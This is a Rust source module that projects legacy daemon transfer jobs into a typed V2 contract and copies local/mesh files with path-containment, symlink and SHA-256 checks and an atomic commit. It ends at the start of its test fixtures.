//! WL-FUNC-011 — the bounded bridge from the daemon's legacy transfer ledger to
//! the strict shared `TransferJobV2` contract.
//!
//! The daemon's durable `TransferJob` still contains legacy source/destination
//! strings, a local string id, and percentage-only progress.  None of those
//! fields can be losslessly or safely reinterpreted as a V2 endpoint, opaque
//! `TransferId`, or byte progress.  This module therefore exposes a deliberately
//! narrow projection: a caller that already owns the typed V2 identity supplies
//! it, and only a clean queued legacy record is projected.  The legacy endpoint
//! strings are never inspected or copied, and no `FileRefId` is minted here.

#![cfg(feature = "async-services")]

use std::{
    fmt,
    fs::{self, File, OpenOptions},
    io::{self, Read, Write},
    path::{Component, Path, PathBuf},
    sync::atomic::{AtomicBool, Ordering},
};

use mde_collab_types::{
    ChecksumMode, ChecksumPolicy, TransferEndpoint, TransferId, TransferJobV2,
    TransferJobV2ValidationError, TransferKind, TransferLocation, TransferOperation, TransferPhase,
    TransferProgress, TransferState as SharedTransferState, MAX_TRANSFER_CONTENT_BYTES,
    TRANSFER_JOB_V2_SCHEMA_VERSION,
};
use sha2::{Digest, Sha256};

use super::job::{Method, TransferJob, TransferState};

/// Which side of a V2 route the Files authority is resolving.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum FilesEndpointRole {
    /// The object the executor will read.
    Source,
    /// The object the executor will replace/write.
    Destination,
}

impl fmt::Display for FilesEndpointRole {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            Self::Source => "source",
            Self::Destination => "destination",
        })
    }
}

/// Closed Files object types understood by the current byte-copy executor.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum FilesObjectType {
    /// A finite regular-file payload.
    RegularFile,
    /// A directory object. It is retained in resolver evidence so it can be
    /// rejected explicitly rather than accidentally opened as a byte stream.
    Directory,
}

/// One registry result returned by the caller-owned Files authority.
///
/// `relative_path` is Files registry data, not a value derived from an opaque
/// object id. Admission accepts it only below the supplied canonical root and
/// independently checks its type, size, and digest before binding it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedFilesEndpoint {
    /// Exact typed identity looked up by Files.
    pub identity: TransferLocation,
    /// Canonical root owned by the Files registry.
    pub canonical_root: PathBuf,
    /// Registry path relative to `canonical_root`.
    pub relative_path: PathBuf,
    /// Monotonic Files registry generation for this identity.
    pub generation: u64,
    /// Lowercase SHA-256 recorded for the generation.
    pub sha256_hex: String,
    /// Exact byte count recorded for the generation.
    pub size_bytes: u64,
    /// Files registry object type.
    pub object_type: FilesObjectType,
    /// Whether Files currently considers the generation materialized.
    pub available: bool,
    /// Whether Files grants source reads to this worker.
    pub readable: bool,
    /// Whether Files grants destination replacement to this worker.
    pub writable: bool,
}

/// A bounded failure returned by the injected Files resolver.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FilesResolveFailure {
    /// The object or its current generation is not materialized.
    Unavailable,
    /// The Files authority denied the requested access.
    PermissionDenied,
    /// The Files registry could not produce trustworthy current state.
    RegistryFailure,
    /// The selected Files authority is read-only and cannot atomically commit a
    /// new destination generation.
    MutationUnsupported,
}

impl fmt::Display for FilesResolveFailure {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            Self::Unavailable => "Files object unavailable",
            Self::PermissionDenied => "Files object access denied",
            Self::RegistryFailure => "Files registry failure",
            Self::MutationUnsupported => "Files destination mutation is unsupported",
        })
    }
}

impl std::error::Error for FilesResolveFailure {}

/// Caller-supplied authority for mapping typed Files identities to registry
/// records. The runtime never derives a path or URL from an opaque id.
pub trait FilesEndpointResolver: Send + Sync {
    /// Resolve one exact endpoint for its requested source/destination role.
    ///
    /// # Errors
    ///
    /// Returns a closed failure when Files cannot supply a current record.
    fn resolve(
        &self,
        identity: &TransferLocation,
        role: FilesEndpointRole,
    ) -> Result<ResolvedFilesEndpoint, FilesResolveFailure>;

    /// Commit one fully written and verified staging file through the Files
    /// authority that resolved the destination. Mutable test/alternate
    /// authorities use the safe default atomic replacement; content-addressed
    /// production authorities override this to update bytes and metadata with
    /// corrected-forward ordering.
    ///
    /// # Errors
    ///
    /// Returns a closed commit failure without exposing a host path.
    fn commit_staged_copy(
        &self,
        admitted: &ResolvedTransferJobV2,
        staged_path: &Path,
        outcome: &FilesCopyOutcome,
    ) -> Result<(), FilesCommitFailure> {
        commit_replace_destination(admitted, staged_path, outcome)
    }
}

/// Immutable Files metadata bound to a job accepted for executor handoff.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BoundFilesEndpoint {
    identity: TransferLocation,
    canonical_path: PathBuf,
    generation: u64,
    sha256_hex: String,
    size_bytes: u64,
    object_type: FilesObjectType,
}

impl BoundFilesEndpoint {
    /// Exact typed Files identity from the V2 job.
    #[must_use]
    pub const fn identity(&self) -> &TransferLocation {
        &self.identity
    }

    /// Canonical path supplied by Files and verified below its canonical root.
    #[must_use]
    pub fn canonical_path(&self) -> &Path {
        &self.canonical_path
    }

    /// Monotonic Files registry generation bound at admission.
    #[must_use]
    pub const fn generation(&self) -> u64 {
        self.generation
    }

    /// Verified lowercase SHA-256 for the bound bytes.
    #[must_use]
    pub fn sha256_hex(&self) -> &str {
        &self.sha256_hex
    }

    /// Verified byte count for the bound bytes.
    #[must_use]
    pub const fn size_bytes(&self) -> u64 {
        self.size_bytes
    }

    /// Verified object type for the bound generation.
    #[must_use]
    pub const fn object_type(&self) -> FilesObjectType {
        self.object_type
    }
}

/// A queued V2 job plus both exact Files generations admitted for execution.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedTransferJobV2 {
    job: TransferJobV2,
    source: BoundFilesEndpoint,
    destination: BoundFilesEndpoint,
    source_record: ResolvedFilesEndpoint,
    destination_record: ResolvedFilesEndpoint,
}

impl ResolvedTransferJobV2 {
    /// The unchanged strict V2 job.
    #[must_use]
    pub const fn job(&self) -> &TransferJobV2 {
        &self.job
    }

    /// Source identity and immutable generation metadata.
    #[must_use]
    pub const fn source(&self) -> &BoundFilesEndpoint {
        &self.source
    }

    /// Destination identity and immutable generation metadata.
    #[must_use]
    pub const fn destination(&self) -> &BoundFilesEndpoint {
        &self.destination
    }

    /// Complete destination registry record bound at executor admission.
    #[must_use]
    pub(super) const fn destination_record(&self) -> &ResolvedFilesEndpoint {
        &self.destination_record
    }
}

/// Verified result of one atomic Local/Mesh Files copy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FilesCopyOutcome {
    /// Bytes read from the bound source and committed to the destination.
    pub bytes_copied: u64,
    /// SHA-256 observed while copying, after matching the bound source record.
    pub sha256_hex: String,
}

/// Closed failure categories returned by a destination mutation authority.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FilesCommitFailure {
    /// The resolver has no typed destination mutation authority.
    MutationUnsupported,
    /// Destination generation or authorization changed after staging.
    ConcurrentDestination,
    /// Safe content staging or installation failed.
    Filesystem,
    /// The canonical metadata command could not be published.
    Publication,
    /// Publication succeeded but the canonical projection did not confirm it
    /// within the bounded observation window; retry is safe and idempotent.
    PublicationUnconfirmed,
}

impl fmt::Display for FilesCommitFailure {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            Self::MutationUnsupported => "Files destination mutation is unsupported",
            Self::ConcurrentDestination => "Files destination generation changed",
            Self::Filesystem => "Files content commit failed",
            Self::Publication => "Files metadata publication failed",
            Self::PublicationUnconfirmed => "Files metadata publication is unconfirmed",
        })
    }
}

impl std::error::Error for FilesCommitFailure {}

/// A typed Local/Mesh executor failure; no path, URL, or secret crosses this
/// boundary into the durable job.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FilesCopyError {
    /// Files changed or rejected an endpoint immediately before open/commit.
    Revalidation(TransferV2ResolutionError),
    /// The operator canceled or paused this attempt.
    Canceled,
    /// Source bytes no longer match their admitted generation.
    SourceChanged,
    /// The destination authority refused or could not commit the verified copy.
    Commit(FilesCommitFailure),
}

impl fmt::Display for FilesCopyError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Revalidation(error) => write!(formatter, "Files revalidation failed: {error}"),
            Self::Canceled => formatter.write_str("transfer attempt canceled"),
            Self::SourceChanged => formatter.write_str("source generation changed during copy"),
            Self::Commit(error) => write!(formatter, "destination commit failed: {error}"),
        }
    }
}

impl std::error::Error for FilesCopyError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Revalidation(error) => Some(error),
            Self::Commit(error) => Some(error),
            Self::Canceled | Self::SourceChanged => None,
        }
    }
}

/// Why a V2 job cannot cross from durable admission into Files execution.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TransferV2ResolutionError {
    /// The durable job no longer satisfies the strict shared contract.
    InvalidJob(TransferJobV2ValidationError),
    /// Executors claim only pristine queued jobs.
    NotQueued,
    /// This resolver lane accepts only canonical local/mesh Files identities.
    NonFilesIdentity(FilesEndpointRole),
    /// Files could not resolve the endpoint.
    Resolver {
        /// Failed endpoint side.
        role: FilesEndpointRole,
        /// Closed resolver failure.
        failure: FilesResolveFailure,
    },
    /// The resolver returned a record for a different typed identity.
    IdentityMismatch(FilesEndpointRole),
    /// The registry record is unavailable or has no valid generation.
    Unavailable(FilesEndpointRole),
    /// The registry did not grant the role-specific access.
    AccessDenied(FilesEndpointRole),
    /// A root or relative path was not canonical and safely contained.
    UnsafePath(FilesEndpointRole),
    /// Filesystem metadata could not be read without following an unsafe path.
    MetadataUnavailable(FilesEndpointRole),
    /// The registry generation metadata did not match the materialized object.
    MetadataMismatch {
        /// Mismatching endpoint side.
        role: FilesEndpointRole,
        /// Stable non-sensitive metadata field name.
        field: &'static str,
    },
    /// Only regular-file payloads can enter the current byte executor.
    IncompatibleObjectType(FilesEndpointRole),
    /// Source and destination resolve to the same canonical object.
    SameCanonicalObject,
    /// The second registry read did not match the first complete generation.
    StaleResolution(FilesEndpointRole),
    /// A required job checksum does not match the bound source generation.
    ChecksumMismatch,
    /// The only executable family in this slice is Local/Mesh.
    UnsupportedKind(TransferKind),
    /// The only executable operation in this slice is typed copy.
    UnsupportedOperation,
}

impl fmt::Display for TransferV2ResolutionError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::InvalidJob(error) => write!(formatter, "invalid V2 job: {error}"),
            Self::NotQueued => formatter.write_str("V2 executor admission requires a queued job"),
            Self::NonFilesIdentity(role) => {
                write!(
                    formatter,
                    "{role} is not a canonical local/mesh Files identity"
                )
            }
            Self::Resolver { role, failure } => write!(formatter, "{role} resolver: {failure}"),
            Self::IdentityMismatch(role) => {
                write!(formatter, "Files returned a different {role} identity")
            }
            Self::Unavailable(role) => write!(formatter, "Files {role} generation is unavailable"),
            Self::AccessDenied(role) => write!(formatter, "Files denied {role} access"),
            Self::UnsafePath(role) => write!(formatter, "Files {role} path is not canonical"),
            Self::MetadataUnavailable(role) => {
                write!(formatter, "Files {role} metadata is unavailable")
            }
            Self::MetadataMismatch { role, field } => {
                write!(
                    formatter,
                    "Files {role} {field} does not match materialized bytes"
                )
            }
            Self::IncompatibleObjectType(role) => {
                write!(formatter, "Files {role} is not a regular-file payload")
            }
            Self::SameCanonicalObject => {
                formatter.write_str("source and destination are the same canonical Files object")
            }
            Self::StaleResolution(role) => {
                write!(
                    formatter,
                    "Files {role} generation changed during admission"
                )
            }
            Self::ChecksumMismatch => {
                formatter.write_str("required checksum does not match the Files source generation")
            }
            Self::UnsupportedKind(kind) => {
                write!(
                    formatter,
                    "V2 {} executor is not implemented",
                    kind.as_str()
                )
            }
            Self::UnsupportedOperation => {
                formatter.write_str("V2 operation is not implemented by the Files copy executor")
            }
        }
    }
}

impl std::error::Error for TransferV2ResolutionError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::InvalidJob(error) => Some(error),
            Self::Resolver { failure, .. } => Some(failure),
            _ => None,
        }
    }
}

/// Resolve and bind both endpoints of one queued V2 job for the Files-owned
/// regular-file executor.
///
/// Admission performs two exact registry reads around independent path,
/// type, size, and SHA-256 verification. Any changed result is stale. Opaque
/// ids are passed to `resolver` as typed values only and are never inspected,
/// formatted into a path, or interpreted as a URL.
///
/// # Errors
///
/// Returns an error for a non-queued/invalid job, non-Files endpoint, resolver
/// mismatch/failure, stale generation, unsafe path, metadata mismatch,
/// incompatible access/type, same-object copy, or required-checksum mismatch.
pub fn resolve_for_execution(
    job: TransferJobV2,
    resolver: &dyn FilesEndpointResolver,
) -> Result<ResolvedTransferJobV2, TransferV2ResolutionError> {
    job.validate()
        .map_err(TransferV2ResolutionError::InvalidJob)?;
    let is_queued =
        job.state == SharedTransferState::Queued && job.progress == TransferProgress::queued();
    let is_claimed = job.state == SharedTransferState::Active
        && job.progress.phase == TransferPhase::Resolving
        && job.progress.attempt > 0;
    if !is_queued && !is_claimed {
        return Err(TransferV2ResolutionError::NotQueued);
    }
    if !matches!(job.kind, TransferKind::Local | TransferKind::Mesh) {
        return Err(TransferV2ResolutionError::UnsupportedKind(job.kind));
    }
    if !matches!(job.operation, TransferOperation::Copy { .. }) {
        return Err(TransferV2ResolutionError::UnsupportedOperation);
    }

    require_files_identity(&job.endpoint.source, FilesEndpointRole::Source)?;
    require_files_identity(&job.endpoint.destination, FilesEndpointRole::Destination)?;

    let source_record = resolve_once(resolver, &job.endpoint.source, FilesEndpointRole::Source)?;
    let destination_record = resolve_once(
        resolver,
        &job.endpoint.destination,
        FilesEndpointRole::Destination,
    )?;
    let source = bind_record(
        &job.endpoint.source,
        FilesEndpointRole::Source,
        &source_record,
    )?;
    let destination = bind_record(
        &job.endpoint.destination,
        FilesEndpointRole::Destination,
        &destination_record,
    )?;

    if source.canonical_path == destination.canonical_path {
        return Err(TransferV2ResolutionError::SameCanonicalObject);
    }
    if job.checksum.mode == ChecksumMode::Require
        && job.checksum.expected_sha256_hex.as_deref() != Some(source.sha256_hex.as_str())
    {
        return Err(TransferV2ResolutionError::ChecksumMismatch);
    }

    ensure_current(
        resolver,
        &job.endpoint.source,
        FilesEndpointRole::Source,
        &source_record,
    )?;
    ensure_current(
        resolver,
        &job.endpoint.destination,
        FilesEndpointRole::Destination,
        &destination_record,
    )?;

    Ok(ResolvedTransferJobV2 {
        job,
        source,
        destination,
        source_record,
        destination_record,
    })
}

fn require_files_identity(
    identity: &TransferLocation,
    role: FilesEndpointRole,
) -> Result<(), TransferV2ResolutionError> {
    if matches!(
        identity,
        TransferLocation::Local { .. } | TransferLocation::Mesh { .. }
    ) {
        Ok(())
    } else {
        Err(TransferV2ResolutionError::NonFilesIdentity(role))
    }
}

fn resolve_once(
    resolver: &dyn FilesEndpointResolver,
    identity: &TransferLocation,
    role: FilesEndpointRole,
) -> Result<ResolvedFilesEndpoint, TransferV2ResolutionError> {
    resolver
        .resolve(identity, role)
        .map_err(|failure| TransferV2ResolutionError::Resolver { role, failure })
}

fn ensure_current(
    resolver: &dyn FilesEndpointResolver,
    identity: &TransferLocation,
    role: FilesEndpointRole,
    expected: &ResolvedFilesEndpoint,
) -> Result<(), TransferV2ResolutionError> {
    let current = resolve_once(resolver, identity, role)?;
    if &current == expected {
        Ok(())
    } else {
        Err(TransferV2ResolutionError::StaleResolution(role))
    }
}

fn bind_record(
    identity: &TransferLocation,
    role: FilesEndpointRole,
    record: &ResolvedFilesEndpoint,
) -> Result<BoundFilesEndpoint, TransferV2ResolutionError> {
    if &record.identity != identity {
        return Err(TransferV2ResolutionError::IdentityMismatch(role));
    }
    if !record.available || record.generation == 0 {
        return Err(TransferV2ResolutionError::Unavailable(role));
    }
    if (role == FilesEndpointRole::Source && !record.readable)
        || (role == FilesEndpointRole::Destination && !record.writable)
    {
        return Err(TransferV2ResolutionError::AccessDenied(role));
    }
    if record.object_type != FilesObjectType::RegularFile {
        return Err(TransferV2ResolutionError::IncompatibleObjectType(role));
    }
    if record.size_bytes > MAX_TRANSFER_CONTENT_BYTES {
        return Err(TransferV2ResolutionError::MetadataMismatch {
            role,
            field: "size",
        });
    }
    if !is_lower_sha256(&record.sha256_hex) {
        return Err(TransferV2ResolutionError::MetadataMismatch {
            role,
            field: "sha256",
        });
    }

    let canonical_path = contained_canonical_path(record, role)?;
    let metadata = fs::metadata(&canonical_path)
        .map_err(|_| TransferV2ResolutionError::MetadataUnavailable(role))?;
    if !metadata.is_file() || metadata.len() != record.size_bytes {
        return Err(TransferV2ResolutionError::MetadataMismatch {
            role,
            field: if !metadata.is_file() { "type" } else { "size" },
        });
    }
    let observed_hash = sha256_file(&canonical_path)
        .map_err(|_| TransferV2ResolutionError::MetadataUnavailable(role))?;
    if observed_hash != record.sha256_hex {
        return Err(TransferV2ResolutionError::MetadataMismatch {
            role,
            field: "sha256",
        });
    }

    Ok(BoundFilesEndpoint {
        identity: identity.clone(),
        canonical_path,
        generation: record.generation,
        sha256_hex: record.sha256_hex.clone(),
        size_bytes: record.size_bytes,
        object_type: record.object_type,
    })
}

fn contained_canonical_path(
    record: &ResolvedFilesEndpoint,
    role: FilesEndpointRole,
) -> Result<PathBuf, TransferV2ResolutionError> {
    if !record.canonical_root.is_absolute()
        || record.relative_path.as_os_str().is_empty()
        || record
            .relative_path
            .components()
            .any(|component| !matches!(component, Component::Normal(_)))
    {
        return Err(TransferV2ResolutionError::UnsafePath(role));
    }

    let root_metadata = fs::symlink_metadata(&record.canonical_root)
        .map_err(|_| TransferV2ResolutionError::MetadataUnavailable(role))?;
    if root_metadata.file_type().is_symlink() || !root_metadata.is_dir() {
        return Err(TransferV2ResolutionError::UnsafePath(role));
    }
    let canonical_root = fs::canonicalize(&record.canonical_root)
        .map_err(|_| TransferV2ResolutionError::MetadataUnavailable(role))?;
    if canonical_root != record.canonical_root {
        return Err(TransferV2ResolutionError::UnsafePath(role));
    }

    let mut candidate = canonical_root.clone();
    for component in record.relative_path.components() {
        let Component::Normal(segment) = component else {
            return Err(TransferV2ResolutionError::UnsafePath(role));
        };
        candidate.push(segment);
        let metadata = fs::symlink_metadata(&candidate)
            .map_err(|_| TransferV2ResolutionError::MetadataUnavailable(role))?;
        if metadata.file_type().is_symlink() {
            return Err(TransferV2ResolutionError::UnsafePath(role));
        }
    }

    let canonical_candidate = fs::canonicalize(&candidate)
        .map_err(|_| TransferV2ResolutionError::MetadataUnavailable(role))?;
    if canonical_candidate != candidate || !canonical_candidate.starts_with(&canonical_root) {
        return Err(TransferV2ResolutionError::UnsafePath(role));
    }
    Ok(canonical_candidate)
}

fn sha256_file(path: &Path) -> io::Result<String> {
    let mut file = File::open(path)?;
    let mut digest = Sha256::new();
    let mut buffer = [0_u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        digest.update(&buffer[..read]);
    }
    Ok(format!("{:x}", digest.finalize()))
}

fn is_lower_sha256(value: &str) -> bool {
    value.len() == 64
        && value
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
}

/// Re-read both Files records and physical metadata immediately before an
/// executor opens either endpoint.
///
/// # Errors
///
/// Returns a stale/mismatch error unless the complete identity, generation,
/// hash, size, type, access, canonical root, and relative path still match the
/// admitted binding.
pub fn revalidate_for_open(
    admitted: &ResolvedTransferJobV2,
    resolver: &dyn FilesEndpointResolver,
) -> Result<(), TransferV2ResolutionError> {
    ensure_current(
        resolver,
        &admitted.job.endpoint.source,
        FilesEndpointRole::Source,
        &admitted.source_record,
    )?;
    ensure_current(
        resolver,
        &admitted.job.endpoint.destination,
        FilesEndpointRole::Destination,
        &admitted.destination_record,
    )?;
    let source = bind_record(
        &admitted.job.endpoint.source,
        FilesEndpointRole::Source,
        &admitted.source_record,
    )?;
    let destination = bind_record(
        &admitted.job.endpoint.destination,
        FilesEndpointRole::Destination,
        &admitted.destination_record,
    )?;
    if source != admitted.source {
        return Err(TransferV2ResolutionError::StaleResolution(
            FilesEndpointRole::Source,
        ));
    }
    if destination != admitted.destination {
        return Err(TransferV2ResolutionError::StaleResolution(
            FilesEndpointRole::Destination,
        ));
    }
    Ok(())
}

/// Copy one admitted Local/Mesh Files object and atomically replace the exact
/// destination object.
///
/// The source is opened without following a final symlink after full resolver
/// revalidation. Bytes are streamed into a create-new sibling, hashed while
/// moving, synced, and compared with the bound generation. The destination is
/// revalidated once more before an atomic rename; rename replaces a raced final
/// symlink itself rather than following it. A canceled attempt never commits.
///
/// # Errors
///
/// Returns a typed error for stale authority state, cancellation, changed
/// source bytes, or a failed safe commit.
pub fn execute_local_mesh_copy(
    admitted: &ResolvedTransferJobV2,
    resolver: &dyn FilesEndpointResolver,
    canceled: &AtomicBool,
) -> Result<FilesCopyOutcome, FilesCopyError> {
    revalidate_for_open(admitted, resolver).map_err(FilesCopyError::Revalidation)?;
    if canceled.load(Ordering::Acquire) {
        return Err(FilesCopyError::Canceled);
    }

    let mut source = open_regular_no_follow(admitted.source.canonical_path())
        .map_err(|_| FilesCopyError::SourceChanged)?;
    let source_metadata = source
        .metadata()
        .map_err(|_| FilesCopyError::SourceChanged)?;
    if !source_metadata.is_file() || source_metadata.len() != admitted.source.size_bytes {
        return Err(FilesCopyError::SourceChanged);
    }

    let destination = admitted.destination.canonical_path();
    let parent = destination
        .parent()
        .ok_or(FilesCopyError::Commit(FilesCommitFailure::Filesystem))?;
    let file_name = destination
        .file_name()
        .and_then(|name| name.to_str())
        .ok_or(FilesCopyError::Commit(FilesCommitFailure::Filesystem))?;
    let temporary = parent.join(format!(
        ".{file_name}.transfer-{}-{}-{}.part",
        admitted.job.transfer,
        admitted.job.progress.attempt,
        std::process::id()
    ));
    let mut options = OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt as _;
        options.mode(0o600).custom_flags(0o400000);
    }
    let mut output = options
        .open(&temporary)
        .map_err(|_| FilesCopyError::Commit(FilesCommitFailure::Filesystem))?;

    let result = (|| {
        let mut digest = Sha256::new();
        let mut copied = 0_u64;
        let mut buffer = [0_u8; 64 * 1024];
        loop {
            if canceled.load(Ordering::Acquire) {
                return Err(FilesCopyError::Canceled);
            }
            let read = source
                .read(&mut buffer)
                .map_err(|_| FilesCopyError::SourceChanged)?;
            if read == 0 {
                break;
            }
            copied = copied
                .checked_add(u64::try_from(read).map_err(|_| FilesCopyError::SourceChanged)?)
                .ok_or(FilesCopyError::SourceChanged)?;
            if copied > admitted.source.size_bytes {
                return Err(FilesCopyError::SourceChanged);
            }
            digest.update(&buffer[..read]);
            output
                .write_all(&buffer[..read])
                .map_err(|_| FilesCopyError::Commit(FilesCommitFailure::Filesystem))?;
        }
        let observed = format!("{:x}", digest.finalize());
        if copied != admitted.source.size_bytes || observed != admitted.source.sha256_hex {
            return Err(FilesCopyError::SourceChanged);
        }
        output
            .sync_all()
            .map_err(|_| FilesCopyError::Commit(FilesCommitFailure::Filesystem))?;
        drop(output);

        revalidate_for_open(admitted, resolver).map_err(FilesCopyError::Revalidation)?;
        if canceled.load(Ordering::Acquire) {
            return Err(FilesCopyError::Canceled);
        }
        let outcome = FilesCopyOutcome {
            bytes_copied: copied,
            sha256_hex: observed,
        };
        resolver
            .commit_staged_copy(admitted, &temporary, &outcome)
            .map_err(FilesCopyError::Commit)?;
        Ok(outcome)
    })();

    if result.is_err() {
        let _ = fs::remove_file(&temporary);
    }
    result
}

fn commit_replace_destination(
    admitted: &ResolvedTransferJobV2,
    staged_path: &Path,
    outcome: &FilesCopyOutcome,
) -> Result<(), FilesCommitFailure> {
    if outcome.bytes_copied != admitted.source.size_bytes
        || outcome.sha256_hex != admitted.source.sha256_hex
    {
        return Err(FilesCommitFailure::Filesystem);
    }
    let destination = admitted.destination.canonical_path();
    let parent = destination.parent().ok_or(FilesCommitFailure::Filesystem)?;
    fs::rename(staged_path, destination).map_err(|_| FilesCommitFailure::Filesystem)?;
    File::open(parent)
        .and_then(|directory| directory.sync_all())
        .map_err(|_| FilesCommitFailure::Filesystem)
}

fn open_regular_no_follow(path: &Path) -> io::Result<File> {
    let mut options = OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt as _;
        options.custom_flags(0o400000);
    }
    let file = options.open(path)?;
    if !file.metadata()?.is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "Files object is not a regular file",
        ));
    }
    Ok(file)
}

/// The typed identity required to project a legacy daemon row.
///
/// All endpoint object identities must already have been issued by the Files
/// authority.  This type is intentionally made only of shared typed contract
/// values; callers cannot provide a path, URL, command, credential, or raw
/// `FileRefId` string to the bridge.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TransferV2Identity {
    /// The existing shared transfer control identity.
    pub transfer: TransferId,
    /// The V2 executor family.
    pub kind: TransferKind,
    /// The typed source/destination route.
    pub endpoint: TransferEndpoint,
    /// The typed operation performed on the route.
    pub operation: TransferOperation,
}

impl TransferV2Identity {
    /// Build an identity from already-admitted typed values.
    #[must_use]
    pub const fn new(
        transfer: TransferId,
        kind: TransferKind,
        endpoint: TransferEndpoint,
        operation: TransferOperation,
    ) -> Self {
        Self {
            transfer,
            kind,
            endpoint,
            operation,
        }
    }
}

/// Why a legacy daemon row cannot be projected into `TransferJobV2`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TransferV2ProjectionError {
    /// The ledger row was not found.
    LedgerJobNotFound(String),
    /// Only a queued row can be represented without fabricating byte progress,
    /// executor attempts, or terminal error semantics.
    UnsupportedLegacyState(TransferState),
    /// A queued row carried fields that are not valid for a clean V2 admission.
    InconsistentQueuedRecord,
    /// The legacy free-form bandwidth token has no lossless V2 bytes/second form.
    LegacyBandwidthLimitNotRepresentable,
    /// The legacy method and typed V2 executor family disagree.
    MethodKindMismatch {
        /// Existing daemon method.
        method: Method,
        /// Supplied V2 executor family.
        kind: TransferKind,
    },
    /// The typed V2 identity or the resulting projection failed shared admission.
    InvalidV2(TransferJobV2ValidationError),
}

impl fmt::Display for TransferV2ProjectionError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::LedgerJobNotFound(id) => write!(formatter, "no transfer `{id}` in the ledger"),
            Self::UnsupportedLegacyState(state) => {
                write!(
                    formatter,
                    "legacy transfer state {state} has no lossless V2 projection"
                )
            }
            Self::InconsistentQueuedRecord => {
                formatter.write_str("queued legacy transfer contains non-queued state data")
            }
            Self::LegacyBandwidthLimitNotRepresentable => formatter.write_str(
                "legacy transfer bandwidth token has no lossless V2 bytes-per-second form",
            ),
            Self::MethodKindMismatch { method, kind } => write!(
                formatter,
                "legacy transfer method {method} cannot project as V2 kind {}",
                kind.as_str()
            ),
            Self::InvalidV2(error) => write!(formatter, "invalid V2 transfer projection: {error}"),
        }
    }
}

impl std::error::Error for TransferV2ProjectionError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::InvalidV2(error) => Some(error),
            Self::LedgerJobNotFound(_)
            | Self::UnsupportedLegacyState(_)
            | Self::InconsistentQueuedRecord
            | Self::LegacyBandwidthLimitNotRepresentable
            | Self::MethodKindMismatch { .. } => None,
        }
    }
}

/// Project one clean queued legacy job into the strict shared V2 contract.
///
/// The supplied identity is the only source of V2 endpoint and transfer ids.
/// The legacy `source`, `dest`, `id`, `progress`, `error`, and `integrity`
/// fields are never converted.  `verify` is the only legacy policy bit with a
/// lossless V2 equivalent; a legacy bandwidth string is rejected rather than
/// guessing units or carrying a command-like token into another contract.
///
/// # Errors
///
/// Returns an error for non-queued or internally inconsistent rows, unsupported
/// legacy policy/method combinations, or failed shared V2 admission.
pub fn project_queued_job(
    job: &TransferJob,
    identity: &TransferV2Identity,
) -> Result<TransferJobV2, TransferV2ProjectionError> {
    if job.state != TransferState::Queued {
        return Err(TransferV2ProjectionError::UnsupportedLegacyState(job.state));
    }
    if job.error.is_some() || job.progress.is_some() || job.integrity.is_some() {
        return Err(TransferV2ProjectionError::InconsistentQueuedRecord);
    }
    if job.policy.bwlimit.is_some() {
        return Err(TransferV2ProjectionError::LegacyBandwidthLimitNotRepresentable);
    }
    if !method_matches_kind(job.method, identity.kind) {
        return Err(TransferV2ProjectionError::MethodKindMismatch {
            method: job.method,
            kind: identity.kind,
        });
    }

    let projected = TransferJobV2 {
        schema_version: TRANSFER_JOB_V2_SCHEMA_VERSION,
        transfer: identity.transfer,
        kind: identity.kind,
        endpoint: identity.endpoint.clone(),
        operation: identity.operation.clone(),
        state: SharedTransferState::Queued,
        progress: TransferProgress {
            phase: TransferPhase::Queued,
            ..TransferProgress::queued()
        },
        checksum: if job.policy.verify {
            ChecksumPolicy::verify()
        } else {
            ChecksumPolicy::off()
        },
        bandwidth_limit_bytes_per_second: None,
        created_unix_ms: job.created_ms,
        updated_unix_ms: job.updated_ms,
    };

    projected
        .admitted()
        .map_err(TransferV2ProjectionError::InvalidV2)
}

fn method_matches_kind(method: Method, kind: TransferKind) -> bool {
    matches!(
        (method, kind),
        (Method::Node, TransferKind::Mesh)
            | (Method::Rsync, TransferKind::Rsync)
            | (Method::Sftp, TransferKind::Sftp)
            | (Method::Http, TransferKind::Http)
    )
}

#[cfg(test)]
mod tests {
    use std::{
        collections::VecDeque,
        fs,
        path::{Path, PathBuf},
        sync::Mutex,
    };

    use super::super::job::TransferPolicy;
    use super::*;
    use mde_collab_types::{
        FileRefId, OpaqueNodeRef, OpaqueProfileRef, OpaqueResourceRef, TransferDirection,
        TransferEndpoint, TransferLocation, TransferOperation,
    };
    use tempfile::TempDir;
    use uuid::Uuid;

    #[derive(Debug)]
    struct ResolverFixture {
        source: Mutex<VecDeque<Result<ResolvedFilesEndpoint, FilesResolveFailure>>>,
